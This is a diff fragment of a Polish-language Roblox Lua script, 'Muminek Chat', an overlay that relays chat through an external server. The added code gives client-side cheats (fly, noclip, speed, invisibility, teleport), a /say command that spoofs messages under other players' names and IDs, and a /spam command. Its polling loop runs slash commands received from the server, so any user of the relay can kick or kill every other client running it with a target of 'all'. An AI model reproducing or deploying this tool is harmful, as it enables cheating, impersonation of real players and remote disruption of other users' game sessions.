+        -- ============================================
+        local function executeCommand(cmdStr)
+            local args = {}
+            for word in cmdStr:gmatch("%S+") do
+                table.insert(args, word)
+            end
+            if #args == 0 then return end
+    
+            local cmd = args[1]:lower()
+            local targetArg = args[2]
+            local extraArg = args[3]
+    
+            local isMe = false
+            if targetArg then
+                local tLower = targetArg:lower()
+                if tLower == "all" or tLower == "me" or tLower == LocalPlayer.Name:lower() or tLower == LocalPlayer.DisplayName:lower() then
+                    isMe = true
+                else
+                    local p = getPlayer(targetArg)
+                    if p == LocalPlayer then isMe = true end
+                end
+            end
+    
+            -- POMOC
+            if cmd == "/help" then
+                createMessageBubble("SYSTEM", 0, table.concat({
+                    "═══ DOSTĘPNE KOMENDY ═══",
+                    "",
+                    "▸ GRACZ",
+                    "/freeze [gracz] - zamraża",
+                    "/unfreeze [gracz] - rozmraża",
+                    "/kill [gracz] - zabija",
+                    "/kick [gracz] [powód] - wyrzuca (self)",
+                    "/follow [gracz] - podąża za graczem",
+                    "/unfollow - zatrzymuje podążanie",
+                    "",
+                    "▸ CZAT",
+                    "/say [gracz] [tekst] - pisze jako gracz",
+                    "/pm [gracz] [tekst] - DM (tag w treści)",
+                    "/spam [ile] [tekst] - spamuje (max 20)",
+                    "/clearchat - czyści czat",
+                    "",
+                    "▸ POSTAĆ (self)",
+                    "/speed [liczba] - prędkość",
+                    "/jump [liczba] - moc skoku",
+                    "/fly - latanie",
+                    "/nofly - wyłącza latanie",
+                    "/noclip - przenikanie ścian",
+                    "/invisible - niewidzialność",
+                    "/visible - przywraca widoczność",
+                    "/heal - pełne HP",
+                    "/reset - reset postaci",
+                    "",
+                    "▸ TELEPORT",
+                    "/tp [gracz] - teleport do gracza",
+                    "/tppos [x] [y] [z] - teleport do pozycji",
+                    "",
+                    "▸ INFO",
+                    "/who - lista graczy",
+                    "/ping - twój ping",
+                    "/pos - twoja pozycja",
+                    "/copy [tekst] - kopiuje do schowka",
+                }, "\n"), false, true)
+    
+            -- GRACZ
+            elseif cmd == "/freeze" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("HumanoidRootPart") then
+                        char.HumanoidRootPart.Anchored = true
+                        createMessageBubble("SYSTEM", 0, "Zamrożono: " .. LocalPlayer.Name, false, true)
+                    end
+                end
+            elseif cmd == "/unfreeze" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("HumanoidRootPart") then
+                        char.HumanoidRootPart.Anchored = false
+                        createMessageBubble("SYSTEM", 0, "Rozmrożono: " .. LocalPlayer.Name, false, true)
+                    end
+                end
+            elseif cmd == "/kill" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChildOfClass("Humanoid") then
+                        char:FindFirstChildOfClass("Humanoid").Health = 0
+                        createMessageBubble("SYSTEM", 0, "Zabito: " .. LocalPlayer.Name, false, true)
+                    end
+                end
+            elseif cmd == "/kick" then
+                if isMe then
+                    LocalPlayer:Kick(extraArg or "Wyrzucony komendą /kick")
+                end
+            elseif cmd == "/follow" then
+                if isMe then
+                    if currentFollowTask then task.cancel(currentFollowTask) currentFollowTask = nil end
+                    local followTarget = getPlayer(extraArg)
+                    if followTarget and followTarget.Character then
+                        createMessageBubble("SYSTEM", 0, "Podążanie za: " .. followTarget.Name, false, true)
+                        currentFollowTask = task.spawn(function()
+                            while followTarget and followTarget.Character and followTarget.Character:FindFirstChild("HumanoidRootPart") do
+                                local char = LocalPlayer.Character
+                                if char and char:FindFirstChildOfClass("Humanoid") then
+                                    char:FindFirstChildOfClass("Humanoid"):MoveTo(followTarget.Character.HumanoidRootPart.Position)
+                                end
+                                task.wait(0.3)
+                            end
+                        end)
+                    end
+                end
+            elseif cmd == "/unfollow" or cmd == "/stopfollow" then
+                if currentFollowTask then
+                    task.cancel(currentFollowTask)
+                    currentFollowTask = nil
+                    createMessageBubble("SYSTEM", 0, "Zatrzymano podążanie.", false, true)
+                end
+    
+            -- CZAT
+            elseif cmd == "/say" then
+                if not targetArg or not extraArg then
+                    createMessageBubble("SYSTEM", 0, "Użycie: /say [gracz] [tekst]", false, true)
+                    return
+                end
+    
+                local textParts = {}
+                for i = 3, #args do table.insert(textParts, args[i]) end
+                local sayText = table.concat(textParts, " ")
+    
+                if sayText == "" then
+                    createMessageBubble("SYSTEM", 0, "Podaj treść.", false, true)
+                    return
+                end
+    
+                local targetPlayer = getPlayer(targetArg)
+                local spoofName = targetPlayer and targetPlayer.Name or targetArg
+                local spoofUserId = targetPlayer and targetPlayer.UserId or 0
+    
+                local msgKey = spoofName .. ":" .. sayText
+                sentLocalMsgs[msgKey] = true
+                createMessageBubble(spoofName, spoofUserId, sayText, false, false)
+    
+                task.spawn(function()
+                    safeHttpRequest({
+                        Url = SERVER_URL .. "/send",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            senderName = spoofName,
+                            userId = spoofUserId,
+                            text = sayText,
+                            spoofed = true,
+                            spoofedBy = LocalPlayer.Name
+                        })
+                    })
+                end)
+    
+            elseif cmd == "/pm" then
+                if not targetArg or not extraArg then
+                    createMessageBubble("SYSTEM", 0, "Użycie: /pm [gracz] [tekst]", false, true)
+                    return
+                end
+    
+                local textParts = {}
+                for i = 3, #args do table.insert(textParts, args[i]) end
+                local pmText = table.concat(textParts, " ")
+    
+                local targetPlayer = getPlayer(targetArg)
+                if not targetPlayer then
+                    createMessageBubble("SYSTEM", 0, "Gracz nie znaleziony.", false, true)
+                    return
+                end
+    
+                local dmText = "[DM → " .. targetPlayer.Name .. "] " .. pmText
+                createMessageBubble(LocalPlayer.Name, LocalPlayer.UserId, dmText, true, false)
+    
+                task.spawn(function()
+                    safeHttpRequest({
+                        Url = SERVER_URL .. "/send",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            senderName = LocalPlayer.Name,
+                            userId = LocalPlayer.UserId,
+                            text = dmText,
+                            isDM = true,
+                            dmTarget = targetPlayer.Name
+                        })
+                    })
+                end)
+    
+            elseif cmd == "/spam" then
+local count = tonumber(targetArg) or 5
+                local textParts = {}
+                for i = 3, #args do table.insert(textParts, args[i]) end
+                local spamText = table.concat(textParts, " ")
+    
+                if spamText == "" then
+                    createMessageBubble("SYSTEM", 0, "Użycie: /spam [ile] [tekst]", false, true)
+                    return
+                end
+    
+                count = math.clamp(count, 1, 20)
+                createMessageBubble("SYSTEM", 0, "Spamuję " .. count .. "x", false, true)
+    
+                task.spawn(function()
+                    for i = 1, count do
+                        createMessageBubble(LocalPlayer.Name, LocalPlayer.UserId, spamText, true, false)
+                        safeHttpRequest({
+                            Url = SERVER_URL .. "/send",
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = HttpService:JSONEncode({
+                                senderName = LocalPlayer.Name,
+                                userId = LocalPlayer.UserId,
+                                text = spamText
+                            })
+                        })
+                        task.wait(0.4)
+                    end
+                end)
+    
+            elseif cmd == "/clearchat" then
+                for _, child in ipairs(ScrollFrame:GetChildren()) do
+                    if child:IsA("Frame") then child:Destroy() end
+                end
+                playSound(4590662766, 1)
+                createMessageBubble("SYSTEM", 0, "Czat wyczyszczony.", false, true)
+    
+            -- POSTAĆ
+            elseif cmd == "/speed" then
+                if isMe then
+                    local speed = tonumber(extraArg) or tonumber(targetArg) or 16
+                    speed = math.clamp(speed, 1, 500)
+                    local char = LocalPlayer.Character
+                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        hum.WalkSpeed = speed
+                        createMessageBubble("SYSTEM", 0, "WalkSpeed: " .. speed, false, true)
+                    end
+                end
+            elseif cmd == "/jump" then
+                if isMe then
+                    local power = tonumber(extraArg) or tonumber(targetArg) or 50
+                    power = math.clamp(power, 1, 500)
+                    local char = LocalPlayer.Character
+                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        hum.UseJumpPower = true
+                        hum.JumpPower = power
+                        createMessageBubble("SYSTEM", 0, "JumpPower: " .. power, false, true)
+                    end
+                end
+            elseif cmd == "/fly" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if hrp and not hrp:FindFirstChild("MuminekFlyVelocity") then
+                        local bv = Instance.new("BodyVelocity")
+                        bv.Name = "MuminekFlyVelocity"
+                        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+                        bv.Velocity = Vector3.zero
+                        bv.Parent = hrp
+    
+                        local bg = Instance.new("BodyGyro")
+                        bg.Name = "MuminekFlyGyro"
+                        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+                        bg.P = 9e4
+                        bg.CFrame = hrp.CFrame
+                        bg.Parent = hrp
+    
+                        createMessageBubble("SYSTEM", 0, "Fly ON – /nofly aby wyłączyć", false, true)
+                    end
+                end
+            elseif cmd == "/nofly" then
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bv = hrp:FindFirstChild("MuminekFlyVelocity")
+                    local bg = hrp:FindFirstChild("MuminekFlyGyro")
+                    if bv then bv:Destroy() end
+                    if bg then bg:Destroy() end
+                    createMessageBubble("SYSTEM", 0, "Fly OFF", false, true)
+                end
+            elseif cmd == "/noclip" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char then
+                        for _, part in ipairs(char:GetDescendants()) do
+                            if part:IsA("BasePart") then part.CanCollide = false end
+                        end
+                        createMessageBubble("SYSTEM", 0, "Noclip ON", false, true)
+                    end
+                end
+            elseif cmd == "/invisible" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char then
+                        for _, part in ipairs(char:GetDescendants()) do
+                            if part:IsA("BasePart") then part.Transparency = 1
+                            elseif part:IsA("Decal") then part.Transparency = 1 end
+                        end
+                        createMessageBubble("SYSTEM", 0, "Invisible ON", false, true)
+                    end
+                end
+            elseif cmd == "/visible" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    if char then
+                        for _, part in ipairs(char:GetDescendants()) do
+                            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then part.Transparency = 0
+                            elseif part:IsA("Decal") then part.Transparency = 0 end
+                        end
+                        createMessageBubble("SYSTEM", 0, "Visible ON", false, true)
+                    end
+                end
+            elseif cmd == "/heal" then
+                if isMe then
+                    local char = LocalPlayer.Character
+                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        hum.Health = hum.MaxHealth
+                        createMessageBubble("SYSTEM", 0, "Uleczono", false, true)
+                    end
+                end
+            elseif cmd == "/reset" then
+                if isMe then
+                    LocalPlayer:LoadCharacter()
+                    createMessageBubble("SYSTEM", 0, "Reset postaci", false, true)
+                end
+    
+            -- TELEPORT
+            elseif cmd == "/tp" then
+                local tpTarget = getPlayer(targetArg)
+                if not tpTarget then
+                    createMessageBubble("SYSTEM", 0, "Gracz nie znaleziony", false, true)
+                    return
+                end
+                local myChar = LocalPlayer.Character
+                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                local tChar = tpTarget.Character
+                local tHrp = tChar and tChar:FindFirstChild("HumanoidRootPart")
+                if myHrp and tHrp then
+                    myHrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3)
+                    createMessageBubble("SYSTEM", 0, "Teleport do: " .. tpTarget.Name, false, true)
+                end
+    
+            elseif cmd == "/tppos" then
+                local x = tonumber(targetArg)
+                local y = tonumber(extraArg)
+                local z = tonumber(args[4])
+                if not x or not y or not z then
+                    createMessageBubble("SYSTEM", 0, "Użycie: /tppos [x] [y] [z]", false, true)
+                    return
+                end
+                local myChar = LocalPlayer.Character
+                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                if myHrp then
+                    myHrp.CFrame = CFrame.new(x, y, z)
+                    createMessageBubble("SYSTEM", 0, "Teleport do pozycji", false, true)
+                end
+    
+            -- INFO
+            elseif cmd == "/who" then
+                local playerList = {}
+                for _, p in ipairs(Players:GetPlayers()) do
+                    table.insert(playerList, "• " .. p.Name .. " - ID: " .. p.UserId)
+                end
+                createMessageBubble("SYSTEM", 0, "Gracze (" .. #playerList .. "):\n" .. table.concat(playerList, "\n"), false, true)
+    
+            elseif cmd == "/ping" then
+                local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
+                createMessageBubble("SYSTEM", 0, "Ping: " .. ping .. " ms", false, true)
+    
+            elseif cmd == "/pos" then
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local p = hrp.Position
+                    createMessageBubble("SYSTEM", 0, string.format("X=%.1f Y=%.1f Z=%.1f", p.X, p.Y, p.Z), false, true)
+                end
+    
+            elseif cmd == "/copy" then
+                local textParts = {}
+                for i = 2, #args do table.insert(textParts, args[i]) end
+                local copyText = table.concat(textParts, " ")
+                if copyText ~= "" then
+                    copyToClipboard(copyText)
+                    showToast("Skopiowano!")
+                end
+    
+            else
+                createMessageBubble("SYSTEM", 0, "Nieznana komenda: " .. cmd .. " (wpisz /help)", false, true)
+            end
+        end
+    
+        -- ============================================
+        --  SEND MESSAGE
+        -- ============================================
+        local function sendMessage()
+            local text = InputBox.Text
+            if text:gsub("%s+", "") == "" then return end
+            InputBox.Text = ""
+    
+            if text:sub(1,1) == "/" then
+                executeCommand(text)
+                task.spawn(function()
+                    safeHttpRequest({
+                        Url = SERVER_URL .. "/send",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            senderName = LocalPlayer.Name,
+                            userId = LocalPlayer.UserId,
+                            text = text
+                        })
+                    })
+                end)
+                return
+            end
+    
+            local msgKey = LocalPlayer.Name .. ":" .. text
+            sentLocalMsgs[msgKey] = true
+            createMessageBubble(LocalPlayer.Name, LocalPlayer.UserId, text, true, false)
+    
+            task.spawn(function()
+                safeHttpRequest({
+                    Url = SERVER_URL .. "/send",
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode({
+                        senderName = LocalPlayer.Name,
+                        userId = LocalPlayer.UserId,
+                        text = text
+                    })
+                })
+            end)
+        end
+    
+        SendBtn.MouseButton1Click:Connect(sendMessage)
+        InputBox.FocusLost:Connect(function(enter) if enter then sendMessage() end end)
+    
+        -- ============================================
+        --  POLLING WIADOMOŚCI Z SERWERA
+        -- ============================================
+        task.spawn(function()
+            if not rawRequest then return end
+            while task.wait(1) do
+                local fetchUrl = SERVER_URL .. "/messages?since=" .. tostring(lastMsgId)
+                local responseBody = safeHttpRequest({ Url = fetchUrl, Method = "GET" })
+                if responseBody and typeof(responseBody) == "string" and #responseBody > 0 then
+                    local decodeOk, msgs = pcall(function() return HttpService:JSONDecode(responseBody) end)
+                    if decodeOk and typeof(msgs) == "table" then
+                        for _, msg in ipairs(msgs) do
+                            local numericId = tonumber(msg.id)
+                            if numericId and numericId > lastMsgId then
+                                lastMsgId = numericId
+                                local msgText = tostring(msg.text or "")
+                                local msgKey = tostring(msg.senderName) .. ":" .. msgText
+                                if not sentLocalMsgs[msgKey] then
+                                    if msgText:sub(1,1) == "/" then
+                                        executeCommand(msgText)
+                                    else
+                                        local isSelf = (msg.senderName == LocalPlayer.Name)
+                                        createMessageBubble(msg.senderName, msg.userId, msgText, isSelf, false)
+                                    end
+                                else
+                                    sentLocalMsgs[msgKey] = nil
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    
+        -- ============================================
+        --  PRZYCISKI TOP BAR
+        -- ============================================
+        MuteBtn.MouseButton1Click:Connect(function()
+            settings.isMuted = not settings.isMuted
+            MuteBtn.Text = settings.isMuted and "🔇" or "🔊"
+            MuteBtn.TextColor3 = settings.isMuted and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(200, 200, 220)
+        end)
+    
+        ClearBtn.MouseButton1Click:Connect(function()
+            for _, child in ipairs(ScrollFrame:GetChildren()) do
+                if child:IsA("Frame") then child:Destroy() end
+            end
+            playSound(4590662766, 1)
+        end)
+    
+        MinBtn.MouseButton1Click:Connect(function()
+            isMinimized = not isMinimized
+            if isMinimized then
+                ScrollFrame.Visible = false
+                InputFrame.Visible = false
+                TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                    Size = UDim2.new(0, 360, 0, 42)
+                }):Play()
+                MinBtn.Text = "➕"
+            else
+                unreadCount = 0
+                UnreadBadge.Visible = false
+                local anim = TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+                    Size = UDim2.new(0, 360, 0, 440)
+                })
+                anim:Play()
+                anim.Completed:Connect(function()
+                    if not isMinimized then
+                        ScrollFrame.Visible = true
+                        InputFrame.Visible = true
+                    end
+                end)
+                MinBtn.Text = "─"
+            end
+            playSound(12221967, 1)
+        end)
+    
+        -- ============================================
+        --  TOGGLE KEY
+        -- ============================================
+        local UIScale = Instance.new("UIScale")
+        UIScale.Parent = MainFrame
+    
+        UserInputService.InputBegan:Connect(function(input, gpe)
+            if not gpe and input.KeyCode == TOGGLE_KEY then
+                if MainFrame.Visible then
+                    local tween = TweenService:Create(UIScale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.8})
+                    tween:Play()
+                    tween.Completed:Connect(function()
+                        MainFrame.Visible = false
+                    end)
+                else
+                    MainFrame.Visible = true
+                    UIScale.Scale = 0.8
+                    TweenService:Create(UIScale, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+                end
+                playSound(12221967, 1.2)
+            end
+        end)
+    
+        print("[Muminek Chat] Załadowano! Naciśnij RightControl aby pokazać/ukryć")
+    end)
